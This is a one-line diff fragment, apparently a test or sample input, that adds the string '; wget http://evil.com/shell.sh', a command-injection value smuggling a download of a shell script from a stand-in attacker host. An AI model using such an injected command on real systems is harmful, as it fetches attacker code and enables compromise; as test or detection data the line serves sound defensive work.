@@ -1,0 +1,1 @@
+; wget http://evil.com/shell.sh
